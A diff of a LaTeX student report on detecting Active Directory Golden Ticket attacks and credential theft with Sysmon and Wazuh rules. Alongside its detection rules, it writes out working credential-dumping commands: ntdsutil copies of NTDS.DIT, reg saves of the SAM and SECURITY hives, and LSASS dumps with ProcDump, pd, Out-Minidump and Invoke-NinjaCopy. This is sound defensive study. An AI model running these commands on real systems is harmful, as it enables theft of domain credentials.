@@ -46,12 +46,12 @@ To keep this simple we are only explaining the basics of the techniques used in 
 For example there is a sever-agent version of Mimikatz called Pypykatz\cite{pypykatz_agent}\cite{pypykatz_server} that is very new and should be a bit harder to detect that the exploits showed here. Unfortunately the student could not make it retrieve the KRBTGT hash.
 \linej
 \linej
-These scripts try to automate as much of the process as possible, which is normally done in an interactive way. This automation helps to ensure that the results are the same each time and reduces the time for each test.
+These scripts try to automate as much of the process as possible, which is normally done in an interactive way. This automation helps to ensure that the results are the same each time and reduces the time for each test. All the tests in this project were executed at least twice. Tests were repeated if there were changes that could affect their results.
 
 \subsubsection{Exploit 1: Local Mimikatz in DC}
 This requires local administrator privileges in the DC and also and an already downloaded version of Mimikatz in the DC, which the attacker can easily get after gaining privileges. If we were to use this example as it is it will probably be detected by the antivirus and Windows Defender, but again they can be disabled by a local administrator and there are techniques to avoid being detected by them.
 \linej
-\lstinputlisting[style=PS,caption=Script to generate and inject a Golden Ticket in the local DC]{scripts/genticket.ps1}
+\lstinputlisting[style=PS,caption=Script to generate and inject a Golden Ticket in the local DC,captionpos=b]{scripts/genticket.ps1}
 \linej
 The script uses Mimikatz to get the needed data to generate the Golden Ticket, saving it to a file for convenience. Then the data is split in variables, each being a piece for generating the forged ticket. The \textit{exit} parameter is to exit the Mimikatz shell after executing the command.
 \linej
@@ -67,7 +67,7 @@ Mimikatz exploits this cache of credentials and reports the results to the user 
 This is similar to the previous example but instead of having a downloaded version of Mimikatz (stored in the disk) we download the program directly into the powershell session, so it is not saved to disk.
 With slight changes this could work too in a computer that is not a DC if the attacker compromised a workstation a domain admin logged onto\cite{dump_ways}.
 \linej
-\lstinputlisting[style=PS,caption=Script to run Mimikatz only in memory and inject a Golden Ticket in the local DC]{scripts/genticket.ps1}
+\lstinputlisting[style=PS,caption=Script to run Mimikatz only in memory and inject a Golden Ticket in the local DC,captionpos=b]{scripts/genticket.ps1}
 \linej
 The script downloads a version of Mimikatz from Github and creates a powershell object with its contents, with can be invoked at any time in this shell\cite{powersploit}\cite{mimikatz_details}. Then as before it dumps the needed information to generate the Golden Ticket in a file, which is read and parsed to store the interesting parameters into variables.
 \linej
@@ -79,7 +79,7 @@ The clear advantage over the previous one is that it should be harder to detect.
 \subsubsection{Exploit 3: Mimikatz with DCSync}
 The DCSync is a Mimikatz feature which will try to impersonate a DC and request account password information from the targeted DC. This technique is less noisy as it does not require direct access to a DC (which are often heavily monitored)\cite{dump_ways}\cite{pentestlab}. To run Mimikatz we still need local administrator privileges in the computer.
 \linej
-\lstinputlisting[style=PS,caption=Script to run Mimikatz with DCSync from a no DC computer in the AD network]{scripts/genticket_dcsync_mimikatz.ps1}
+\lstinputlisting[style=PS,caption=Script to run Mimikatz with DCSync from a no DC computer in the AD network,captionpos=b]{scripts/genticket_dcsync_mimikatz.ps1}
 \linej
 This follows the same structure as the previous cases, but this time with the dcsync option.
 \linej
@@ -122,7 +122,7 @@ The obvious downside of this method for the attacker is that Metasploit is very 
 Of course there is no real need to use Metasploit to get a remote shell to run Mimikatz. The attacker could use ssh, run remote commands individually with \textit{psexec} or use the Windows Remote Shell. But some of these need to be enabled and they would not be much different of the previous examples.
 
 \subsubsection{Exploit 5: Hashdump with Meterpreter}
-Using a reverse tcp exploit the attacker access the targeted DC with a Meterpreter shell. This is similar to the previous case but using the Meterpreter command \textit{hashdump} instead of the DCSync retrieval of Kiwi\cite{pentestlab}. This stills uses Kiwi to generate the Golden Ticket.
+Using a reverse TCP exploit the attacker access the targeted DC with a Meterpreter shell. This is similar to the previous case but using the Meterpreter command \textit{hashdump} instead of the DCSync retrieval of Kiwi\cite{pentestlab}. This stills uses Kiwi to generate the Golden Ticket.
 \linej
 \lstinputlisting[style=ruby]{scripts/metasploit_p1_hashdump.rc}
 \linej
@@ -136,43 +136,6 @@ Again there is a migration to an administrator account of the AD. In this case a
 \end{figure}
 As before it is expected of the DCs to be more monitored. This means that the DCSync version is more interesting to an attacker because it has the same difficulty and beneficts at a lower risk.
 
-\subsubsection{Exploit 6: Retrieval of NTDS.DIT}
-Another way to get the desired information is to copy the database of the AD Domain Services (the NTDS.DIT file) and conduct an offline password audit of the domain. This means once we have this data we can use a wide selection of tools to extract or crack the KRBTGT password.
-Fortunately for the attacker there are builtin Microsoft commands to accomplish this without the need to use scripts, third-party tools or injection into running processes\cite{dump_ways}\cite{ntdsdit_tools}\cite{ntdsutil_cyberis}\cite{extracting_ntds}\cite{ntds_powershell}.
-\linej
-\linej
-This case was not automated because is simpler than the rest and it was harder to do so because it uses its own type of shell: \textit{ntdsutil}.
-The attacker has to open a shell as administrator in a DC and introduce the next input to create the backup:
-\begin{lstlisting}[style=PS,frame=none]
-ntdsutil
-activate instance ntds
-ifm
-create full C:\Users\Administrator\Downloads\dump_ntds
-\end{lstlisting}
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=\textwidth]{figuras/ntdsutil.png}
-	\caption{Backing up the database of the AD using the ntdsutil shell}
-\end{figure}
-The new directory contains all necessary files to extract the necessary data to generate a Golden Ticket.
-\linej
-\linej
-There are multiple ways to protect the NTDS.DIT file\cite{protect_NTDS}\cite{hood}:
-\begin{itemize}
-	\item Monitor or restrict the ntdsutil command.
-	\item Backup and disk encryption.
-	\item Restrict access to DCs and AD administrators.
-	\item Remove the ability to start/stop the Volume Shadow Copy service from ALL users on the system.
-	\item Remove the ability to modify the security settings of the Volume Shadow Copy service from all users except for SYSTEM.
-\end{itemize}
-Of course there is still the task of building the Golden Ticket, for which any of the shown methods would suffice.
-\linej
-\linej
-In our case the easiest measure is to set a rule that is triggered by the existence of a suspicious string related to the \textit{ntdsutil} command:
-\begin{lstlisting}[style=xml,numbers=none]
-<match>ntds.dit|GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS</match>
-\end{lstlisting}
-But of course this is not very efficient and it may be useless.
 
 
 \subsection{Detection of the attack with Windows events}
@@ -221,15 +184,15 @@ Each time a Mimikatz shell spawns certain DLLs are loaded. The technique to iden
 Grouping is a very effective technique, but it may require a lot of work to identify its components. In some cases the attack may not produce enough noise or it may not be possible to tell it apart from the normal events of the system\cite{sysmon}\cite{sysmon_event_7_mimikatz}.
 \linej
 \linej
- The load of a DLL can be detected by the event 7 of Sysmon and the grouping can be identified with Wazuh rules.
+ The load of a DLL can be detected by the event 7 of Sysmon and the grouping can be identified with Wazuh rules. It also can be detected by the event 10 of Sysmon, for inter-process access, but a greater cost of bandwith.
  For this task is better to configure Sysmon in a whitelisting manner, to avoid logging too much. Monitoring these 5 images is enough:
 \linej
-\lstinputlisting[style=xml,caption=Sysmon monitoring of event 7]{scripts/sysmon_event_7.xml}
+\lstinputlisting[style=xml,caption=Sysmon monitoring of event 7,captionpos=b]{scripts/sysmon_event_7.xml}
 \linej
 On the manager side the next rules are needed:
 \linej
-\lstinputlisting[style=xml,caption=Rules for suspecting a Mimikatz execution as a group of events]{scripts/rules_event_7_mimikatz_alternative.xml}
-The \textit{61609} rule is the parent of these rules because it marks the log as a Sysmon event of type 7.
+\lstinputlisting[style=xml,caption=Rules for suspecting a Mimikatz execution as a group of events,captionpos=b]{scripts/rules_event_7_mimikatz_alternative.xml}
+The \textit{sysmon\_event7} means that another rule has marked the log as a Sysmon event of type 7.
 \linej
 The \textit{same\_field} option means that every one of the matches must have the same value in the designed field, which in this case means that these events come from the same computer.
 \linej
@@ -241,21 +204,22 @@ The last rule identifies the use of the DLLs in a 10 seconds gap as the executio
 \linej
 \linej
 The problem of these less precise rules is that it is possible to have false positives. None were seen during this project for this case.
-%\linej
-%Detecting the use of every variant of Mimikatz is virtually impossible, not only because their sheer number due to its popularity but because anyone can compile their own. Therefore the logical way to detect Mimikatz would be to detect the basic step for every version: the interaction with the LSASS and process injection.
-%TODO detect dump lsass
+\linej
+Unfortunately due to the way OSSEC matches rules there is no way to have an hierarchy of rules to trigger a precise grouping rule or the other one.
+\linej
+Detecting the use of every variant of Mimikatz is virtually impossible, not only because their sheer number due to its popularity but because anyone can compile their own. Therefore the logical way to detect Mimikatz would be to detect the basic step for every version: the interaction with the LSASS and process injection. More can be read on page \pageref{detect_lsass}.
 
 \begin{table}[H]
 	\centering
 	\begin{tabular}{|l|l|l|}
 		\hline
 		\rowcolor{gray!30}
-		Exploit & Detected & As expected \\ \hline
-		Exploit 1: Local Mimikatz in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 2: Mimikatz from memory in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 3: Mimikatz with DCSync& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 4: DCSync with Kiwi& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 5: Hashdump with Meterpreter& \cellcolor{red!60}Yes& \cellcolor{green!60}Yes\\ \hline
+		Exploit & Detected \\ \hline
+		1: Local Mimikatz in DC& \cellcolor{green!60}Yes\\ \hline
+		2: Mimikatz from memory in DC& \cellcolor{green!60}Yes\\ \hline
+		3: Mimikatz with DCSync& \cellcolor{green!60}Yes\\ \hline
+		4: DCSync with Kiwi& \cellcolor{green!60}Yes\\ \hline
+		5: Hashdump with Meterpreter& \cellcolor{green!60}Yes\\ \hline
 	\end{tabular}
 	\caption{Exploit detection by grouping events}
 \end{table}
@@ -289,8 +253,8 @@ In this case the command is a script to get all the tickets of all the sessions 
 \linej
 Doing this with only powershell ensures it will work in any Windows system without external programs. The downside of this parsing and my limited knowledge of powershell is that the script is a bit bulky and the dependency of the format of the output of klist.
 \linej
-\lstinputlisting[style=PS,caption=Script to scan and parse to JSON the tickets in the cache]{scripts/klist.ps1}
-\lstinputlisting[style=PS,caption=Way to get the MaxTicketAge from the Group Policy]{scripts/report.ps1}
+\lstinputlisting[style=PS,caption=Script to scan and parse to JSON the tickets in the cache,captionpos=b]{scripts/klist.ps1}
+\lstinputlisting[style=PS,caption=Way to get the MaxTicketAge from the Group Policy,captionpos=b]{scripts/report.ps1}
 \linej
 Unfortunately the way to get the data in the last script does not work with remote commands because Windows remote commands only allow certain types of commands. In any case the \textit{MaxTicketAge} value is not normally changed and it requires AD administrator privileges to do it, so due to the time constrains of the project this automation was abandoned. There is also other ways to get the \textit{MaxTicketAge} value, but as mentioned this is not something that we should spend time on.
 \linej
@@ -310,7 +274,7 @@ Next there is an example of the difference between the normal output of klist an
 \linej
 The time difference mentioned before is a very easy way to detect a forged ticket. With a simple subtraction in the powershell script only a rule that makes a number comparison in the manager is needed to launch the alert.
 \linej
-\lstinputlisting[style=xml,caption=Rules to detect a suspicious expiration age from the report of the klist script]{scripts/rule_klist.xml}
+\lstinputlisting[style=xml,caption=Rules to detect a suspicious expiration age from the report of the klist script,captionpos=b]{scripts/rules_klist.xml}
 \linej
 The purpose of the first rule is to identify any log in JSON with \textit{MaxTicketAge} and \textit{TicketExpireHours} fields. The second rule is used to examine the contents of the \textit{TicketExpireHoursGap} field of the logs that the first rule has identified. If the value of the \textit{TicketExpireHoursGap} field starts with a digit different than 0 then it means that \textit{MaxTicketAge} $>$ \textit{TicketExpireHours}, therefore the expiration age is greater that it should, triggering an alert.
 Additionally it can only trigger once each 60 seconds, to avoid flooding of alerts.
@@ -326,11 +290,11 @@ The testing of the script was satisfactory, the scripts that inject a TGT were d
 		\hline
 		\rowcolor{gray!30}
 		Exploit & Detected & As expected \\ \hline
-		Exploit 1: Local Mimikatz in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 2: Mimikatz from memory in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 3: Mimikatz with DCSync& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
-		Exploit 4: DCSync with Kiwi& \cellcolor{red!60}No& \cellcolor{green!60}Yes\\ \hline
-		Exploit 5: Hashdump with Meterpreter& \cellcolor{red!60}No& \cellcolor{green!60}Yes\\ \hline
+		1: Local Mimikatz in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
+		2: Mimikatz from memory in DC& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
+		3: Mimikatz with DCSync& \cellcolor{green!60}Yes& \cellcolor{green!60}Yes\\ \hline
+		4: DCSync with Kiwi& \cellcolor{red!60}No& \cellcolor{green!60}Yes\\ \hline
+		5: Hashdump with Meterpreter& \cellcolor{red!60}No& \cellcolor{green!60}Yes\\ \hline
 	\end{tabular}
 	\caption{Exploit detection by the klist script}
 \end{table}
@@ -374,7 +338,7 @@ Allowing the attacker to access the \textit{HOST} service on that computer with 
 Silver Tickets get registered in the Kerberos' cache in the same way as the Golden Tickets, so they can be detected with the klist script. The execution of Mimikatz can be detected with grouping just as before.
 
 \subsection{Mitigation}
-These exploits take advantage of the inherent weaknesses of Kerberos, so there is no way to prevent them. Nevertheless, Microsoft provides a publicly available guide explaining how to mitigate this kind of attacks\cite{microsoft_mitigation}.
+These exploits take advantage of the inherent weaknesses of Kerberos, so there is no way to prevent them. Nevertheless, Microsoft provides a public guide explaining how to mitigate this kind of attacks\cite{microsoft_mitigation}.
 The easiest way to mitigate this attack is to change the password of the KRBTGT account to invalidate any existing Golden Ticket, which has to be done twice (make sure the domain converges before doing the second password change\cite{hood}), but it also invalidates existing proper TGTs.
 \linej
 The recommendation from Microsoft is to regularly reset the password, which can be done with their official script\cite{tarlogic_comprehension}\cite{adsecurity_483}\cite{reset_script}. This could be also triggered by alerts that we are confident detect Golden Tickets, but as mentioned this could affect other functionality and so the decision is for the network administrators to make. Any TGT that is not valid produces an error in a TGS request, which can be used for exposing an attacker\cite{scom_GT}.
@@ -413,3 +377,184 @@ Another way of detection is to use YARA to look for certain patterns in memory, 
 YARA is very interesting for this kind of project, but it belongs to the Virustotal pack of malware detection tools and so it could be used with Wazuh with a Virustotal API key. The free version only allows a few queries and we didn't consider the option of getting a premium key because there has been for months an open issue in the Github page of Wazuh for integrating it with YARA (as other IDSs have done before), which has recently evolved to an issue to integrate YARA into Wazuh as a module\cite{yara_module}.
 %Unfortunately this was not done before this part of the project as completed, so there was no time left to investigate more on it.
 %TODO revisar estado issue en el futuro
+
+
+\section{More about the extraction of credentials}
+In the previous section the extraction of credentials was explained to understand the details surrounding a Golden Ticket attack. This includes extracting password hashes from the memory of the LSASS process with Mimikatz or Hashdump. But there are more ways of extraction that are used against AD network now a days.
+\linej
+Once credentials have been retrieved an attacker has more options, like generating a Golden Ticket.
+The key points of access are the \textit{NTDS.DIT} file that is stored in disk and the running process \textit{lsass.exe}.
+
+\subsection{Exploit methods}
+Because the database file of the AD accounts is locked from copying and reading, only Windows tools are allowed to. These tools are \cite{dump_ways}:
+\begin{itemize}
+	\item Reg: Allows to change or save registry entries, including those that contain credentials.
+	\item Ntdsutil: Provides management of this database, including creation of backups.
+	\item WMIC: Commands for the Windows Management Instrumentation. They allow all kinds of remote management, including copy of files using Shadow Copy.
+\end{itemize}
+Another way to extract these credentials is to dump them from memory using third party tools and scripts. This is saving part of the data of a process running in the system\cite{dump_ways}.
+There are multiple tools available for this, but in this project only these were used: Mimikatz, Hashdump, ProcDump, pd, Minidump and Invoke-NinjaCopy.
+\linej
+Some of these tools have the option to retrieve the password or hashes history, meaning that the attacker could gain valuable insight on the password policy of the target.
+\linej
+\linej
+There was no effort to automate these exploits because they are too simple.
+All the extraction programs were executed with local administrator privileges in a DC.
+
+\subsubsection{Exploit 6: Retrieval of NTDS.DIT with ntdsutil}
+Another way to get the desired information is to copy the database of the AD Domain Services (the NTDS.DIT file) and conduct an offline password audit of the domain. This means once we have this data we can use a wide selection of tools to crack it\cite{ntdsdit_tools}\cite{extracting_ntds}\cite{ntds_powershell}.
+\linej
+\linej
+The attacker has to open a shell as administrator in a DC and introduce the next input to create the backup:
+\begin{lstlisting}[style=PS,frame=none]
+ntdsutil
+activate instance ntds
+ifm
+create full C:\temp\ntdsutil
+\end{lstlisting}
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{figuras/ntdsutil.png}
+	\caption{Backing up the database of the AD using the ntdsutil shell}
+\end{figure}
+There are other ways to use ntdsutil in ways harder to detect\cite{more_dumps}, but this is enough for gathering events for analysis.
+\linej
+\linej
+In our case the easiest measure is to set a rule that is triggered by the existence of a suspicious string related to the \textit{ntdsutil} command:
+\begin{lstlisting}[style=xml,numbers=none]
+<match>GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS|c:\\windows\\ntds|ntds.dit</match>
+\end{lstlisting}
+But of course this is not very efficient and it may be useless.
+
+\subsubsection{Exploit 7: Storing registry entries with Reg}
+These commands produce the different save files, each of a different group of credentials, that can be later extracted offline with certain tools\cite{more_dumps}:
+\begin{lstlisting}[style=PS]
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+\end{lstlisting}
+\linej
+Reg is not detected as malware because it is a builtin tool in Windows. But we can detect it with Sysmon and Wazuh. With Sysmon we report the execution of Reg with the event 1, reporting the creation of a process:
+\begin{lstlisting}[style=xml]
+<ProcessCreate onmatch="include">
+	<Image condition="contains">reg.exe</Image>
+</ProcessCreate>
+\end{lstlisting}
+\linej
+And Wazuh to trigger an alert:
+\lstinputlisting[style=xml]{scripts/rules_reg.xml}
+\linej
+The parent rule matches the creation of Reg from the report of Sysmon.
+\linej
+The second rule detects the \textit{save} string in the reg command.
+\linej
+The rest of the rules detect the registry strings for credentials.
+\linej
+\linej
+Of course it is possible that these rules do not cover all the extraction uses of Reg.
+
+\subsubsection{Exploit 8: Dump of LSASS with ProcDump}
+ProcDump\cite{procdump} is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike. This program can be used to create a dump file of the running \textit{lsass.exe} process:
+\begin{lstlisting}[style=PS,numbers=none]
+C:\Users\Administrator\Downloads\procdump.exe -accepteula -64 -ma lsass.exe c:\temp\lsass.dmp
+\end{lstlisting}
+\linej
+The dumped file can be used to extract the credentials by other programs, like Mimikatz\cite{more_dumps}.
+
+\subsubsection{Exploit 9: Dump of LSASS with pd}
+ProcessDumper, also known as pd\cite{pd}, is another program to dump the \textit{lsass.exe} contents. For example if the id of the process is 552:
+\begin{lstlisting}[style=PS,numbers=none]
+C:\Users\Administrator\Downloads\pd.exe -p 552 > c:\temp\lsass.dump
+\end{lstlisting}
+\linej
+Again the attacker needs to retrieve the contents of the file using certain programs.
+
+\subsubsection{Exploit 10: Dump of LSASS with Minidump}
+Minidump is a script from the PowerSploit Post-Explotation Framework\cite{powersploit}. It can be combined with the \textit{Get-Process} builtin to dump the process into a file:
+\begin{lstlisting}[style=PS]
+Import-Module c:\users\administrator\downloads\PowerSploit-master\Exfiltration\Out-Minidump.ps1
+Get-Process lsass | Out-Minidump -DumpFilePath c:\temp
+\end{lstlisting}
+
+\subsubsection{Exploit 11: Dump of LSASS with Invoke-NinjaCopy}
+%%fixes needed
+%%	%https://github.com/PowerShellMafia/PowerSploit/commit/bd6fe64316afe293d6b4cdf095ed3cfb64b6ab25
+%%	%https://github.com/PowerShellMafia/PowerSploit/issues/293
+Another PowerSploit module that can be used to dump LSASS into a file is \textit{Invoke-NinjaCopy}:
+\begin{lstlisting}[style=PS]
+Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit"  -LocalDestination "c:\temp\ntds.dit"
+\end{lstlisting}
+
+\subsection{Detection of process accessing LSASS} \label{detect_lsass}
+This event 10 of Sysmon reports when a process access another process, possibly detecting hacking tools that read the memory contents of processes\cite{sysmon}.
+This event can be used to detect LSASS dumps, at least in some cases\cite{sysmon_event_10_lsass}.
+\linej
+The downside is it can generate significant amounts of logging, therefore it was configured to log only the LSASS process and exclude the instances from the OSSEC agent and the Virtual Box service:
+\begin{lstlisting}[style=xml]
+<ProcessAccess onmatch="include">
+	<TargetImage condition="contains">C:\Windows\System32\lsass.exe</TargetImage>
+</ProcessAccess>
+<ProcessAccess onmatch="exclude">
+	<SourceImage condition="contains">C:\Windows\System32\vboxservice.exe</SourceImage>
+	<SourceImage condition="contains">C:\Program Files (x86)\ossec-agent\ossec-agent.exe</SourceImage>
+</ProcessAccess>
+\end{lstlisting}
+\linej
+After some analysis of these events it was clear that normal accesses could be identified by the \textit{grantedAccess} field. They had a value of \textit{0x3000} (even though these do not happen often) or \textit{0x1000} if the process is \textit{svchost.exe}. The detected malicius programs produced at least one event with a different value on this field.
+\linej
+\linej
+The next rules detect the unusual value of \textit{grantedAccess} in an event of type 10 of Sysmon:
+\lstinputlisting[style=xml]{scripts/rules_lsass.xml}
+\linej
+The first identifies events of type 10 for the LSASS process.
+\linej
+The second rule triggers if the string \textit{UNKNOWN} is in the field \textit{callTrace}. This occurrence was found during testing of the exploits 4 and 5, that use a reverse TCP shell to connect to their target. But it is possible that it would cause false positives on a real network, even though none were found during this project.
+\linej
+The third and fourth match the normal cases, excluding them from the detection of the last rule.
+\linej
+The last rule uses a regular expression to match any hexadecimal value of \textit{grantedAccess}, therefore detecting any unusual value, because all normal logs have being identified as normal at this point.
+\linej
+\linej
+The results may change with the size of the database, the status of the system and the version of the system and the programs.
+All the exploits used until this point were tested, resulting in half producing unusual values, therefore being detected.
+
+\begin{table}[H]
+	\begin{tabularx}{\textwidth}{|l|X|}
+		\hline
+		\rowcolor{gray!30}
+		Exploit & unusual grantedAccess\\ \hline
+		1: Local Mimikatz in DC& \cellcolor{green!60}0x143a\\ \hline
+		2: Mimikatz from memory in DC& \cellcolor{green!60} 0x143a\\ \hline
+		3: Mimikatz with DCSync& \cellcolor{red!60}\\ \hline
+		4: DCSync with Kiwi& \cellcolor{red!60}\\ \hline
+		5: Hashdump with Meterpreter& \cellcolor{green!60}0x1f3fff\\ \hline
+		6: Retrieval of NTDS.DIT with ntdsutil& \cellcolor{red!60}\\ \hline
+		7: Storing registry entries with Reg& \cellcolor{red!60}\\ \hline
+		8: Dump of LSASS with ProcDump& \cellcolor{green!60}3 times 0x1fffff\\ \hline
+		9: Dump of LSASS with pd& \cellcolor{green!60}
+			0x1f3fff \linej
+			0x1452 followed by 0x1410, this pair repeated 28 times \linej
+			0x1452 \\ \hline
+		10: Dump of LSASS with Minidump& \cellcolor{green!60}
+			0x1f3fff \linej
+			0x1fffff \\ \hline
+		11: Dump of LSASS with Invoke-NinjaCopy& \cellcolor{red!60}\\ \hline
+	\end{tabularx}
+	\caption{Exploit detection of unusual \textit{grantedAccess} values}
+\end{table}
+
+\subsection{Mitigation}
+Some of the measures for the Golden Ticket attack can be used for this, particularly those about protecting LSASS.
+\linej
+There are multiple ways to protect the NTDS.DIT file\cite{protect_NTDS}\cite{hood}:
+\begin{itemize}
+	\item Monitor or restrict the ntdsutil command.
+	\item Backup and disk encryption.
+	\item Restrict access to DCs and AD administrators.
+	\item Remove the ability to start/stop the Volume Shadow Copy service from ALL users on the system.
+	\item Remove the ability to modify the security settings of the Volume Shadow Copy service from all users except for SYSTEM.
+\end{itemize}
+
+\subsection{Conclusion}
+%TODO
